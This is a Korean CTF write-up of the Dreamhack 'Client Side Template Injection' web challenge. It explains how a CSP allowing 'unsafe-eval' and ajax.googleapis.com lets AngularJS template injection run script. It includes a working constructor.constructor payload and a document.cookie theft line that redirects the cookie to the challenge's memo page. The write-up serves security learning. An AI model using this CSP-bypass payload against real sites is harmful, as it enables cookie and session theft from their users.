---
title: "드림핵 lv.2 - Client Side Template Injection"
date: 2025-03-24 00:00:00 +0800
categories: [Wargame, Dreamhack]
tags: [cyber security, writeup, dreamhack, web hacking, template injection] 
description: 드림핵 Client Side Template Injection 웹해킹 워게임 풀이
---

[https://dreamhack.io/wargame/challenges/437/](https://dreamhack.io/wargame/challenges/437/)
# 문제 설명
Exercise: Client Side Template Injection에서 실습하는 문제입니다.

---
# 문제 풀이
## 웹사이트 분석
이번에도 웹사이트 자체는 지난번 풀었던 [XSS Filtering Bypass](https://hoonsooni.com/posts/dreamhack_xss_filtering_bypass/), [XSS Filtering Bypass Advanced](https://hoonsooni.com/posts/dreamhack_xss_filtering_bypass_advanced/), [CSP Bypass](https://hoonsooni.com/posts/dreamhack_csp_bypass/), [CSP Bypass Advanced](https://hoonsooni.com/posts/dreamhack_csp_bypass_advanced/)에서 다뤄진 것과 거의 비슷하여 딱히 분석할 것이 없다.
## 코드 분석
```python
@app.after_request
def add_header(response):
    global nonce
    response.headers['Content-Security-Policy'] = f"default-src 'self'; img-src https://dreamhack.io; style-src 'self' 'unsafe-inline'; script-src 'nonce-{nonce}' 'unsafe-eval' https://ajax.googleapis.com; object-src 'none'"
    nonce = os.urandom(16).hex()
    return response
```

```python
@app.route("/vuln")
def vuln():
    param = request.args.get("param", "")
    return param
```
이번에 약간씩 달라진 부분만 가져와 보았다. <br />
우선 해당 웹 서비스에는 CSP 정책 설정이 걸려있어서 아무 스크립트나 실행시킬 수 없다. <br />

그리고 가장 마지막으로 풀이했던 CSP Bypass Advanced 문제와는 다르게 /vuln 페이지가 또 다시 유저로부터 받은 값을 아무런 과정도 거치지 않고 그대로 화면에 출력하는 방식으로 변화했다.<br />
참고로 이 전에는 param 값을 완전 문자열로 변환하여 코드의 "결과"가 아닌 코드 자체의 "문자열"을 출력했다.<br />
## 최종 풀이
### 취약점 분석
이 전과는 달라진 CSP 부분이 뭔가 미심쩍다.<br />
괜히 `unsafe-eval`이 있는 것이 아닌 것 같고 해당 URL의 시작도 `https://ajax.googleapis.com`인 것을 보면 아래 코드처럼 angular를 사용하는 웹 페이지에서 사용하는 URL과 호스트가 동일하다.

```html
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.8.3/angular.min.js"></script>`
```

Angular를 사용하면 `html`이나 `body` 태그에 `ng-app` 속성을 추가해서 앵귤러의 탬플릿을 사용할 수 있게 된다. 여기서 **Template Injection** 취약점이 발생한다.
### 익스플로잇
아무튼 우리는 /vuln 페이지를 이용해야한다.<br />

```html
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.8.3/angular.min.js"></script><html ng-app>{{ constructor.constructor("alert(1)")() }}</html>
```
스크립트 하나를 테스트해보자.<br />
이런식으로 angular 스크립트와 ng-app 속성을 가진 html 태그를 함께 보내주고 탬플릿 내부에 생성자를 사용하여 자바스크립트 코드를 실행하는 방식이다.<br />

해당 코드를 /vuln?param 값으로 전달해주면 alert 창이 올바르게 뜨는 것을 확인할 수 있다.<br />

마지막으로 생성자 인자로 `location.href='/memo?memo='+document.cookie`를 입력하고 /flag 페이지에서 스크립트 전체를 입력하여 보내면 /memo 페이지에서 플래그를 확인할 수 있다.
# 배운 것
CSP의 `unsafe-eval` 값에 대해 공부할 수 있었고 angular의 기본 동작 방식에 대해서 얕게나마 알게됐다.